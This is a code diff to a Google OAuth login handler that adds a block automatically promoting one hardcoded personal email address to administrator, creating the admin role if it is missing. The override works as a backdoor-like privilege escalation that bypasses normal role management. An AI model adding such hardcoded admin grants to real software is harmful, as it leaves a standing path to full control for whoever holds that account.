@@ -401,6 +401,22 @@ app.post('/api/auth/google', async (req, res) => {
       }) as any;
     }
 
+    // --- AUTO-ADMIN OVERRIDE FOR OWNER ---
+    if (email === 'lxravi100@gmail.com' && (!user!.role || user!.role.role_slug !== 'admin')) {
+      let adminRole = await prisma.role.findUnique({ where: { role_slug: 'admin' } });
+      if (!adminRole) {
+        adminRole = await prisma.role.create({
+          data: { role_name: 'Administrator', role_slug: 'admin', is_system_role: true, priority_level: 100 }
+        });
+      }
+      user = await prisma.user.update({
+        where: { email },
+        data: { role_id: adminRole.role_id },
+        include: { role: true }
+      }) as any;
+    }
+    // -------------------------------------
+
     if (user!.status === 'suspended' || user!.status === 'banned') {
       return res.status(403).json({ error: "Account suspended. Please contact support." });
     }
